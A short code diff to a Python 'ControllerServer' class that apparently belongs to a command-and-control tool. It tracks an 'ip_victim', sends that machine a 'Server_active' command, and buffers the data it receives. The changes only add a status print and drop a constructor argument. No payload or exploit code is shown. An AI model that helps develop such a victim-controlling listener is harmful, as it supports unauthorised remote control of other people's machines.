@@ -101,6 +101,7 @@ class ControllerServer:
                     if self.ip_victim is None or self.ip_victim != ip_victim:
                         self.ip_victim = ip_victim
                         self.send_command(message="Server_active")
+                        print(f"UDP server listening on {self.ip_victim}:{self.port_listen} (press Ctrl+C to stop)")
 
                     if signal:
                         self.buffer += data_str
@@ -127,7 +128,7 @@ class ControllerServer:
             print("Socket closed. Bye.")
 
 def main():
-    controller = ControllerServer(ip_victim=IP)
+    controller = ControllerServer()
     listener_thread = threading.Thread(target=controller.listen_clients, daemon=True)
     listener_thread.start()
     print("\033[32m" + banner + "\033[0m")
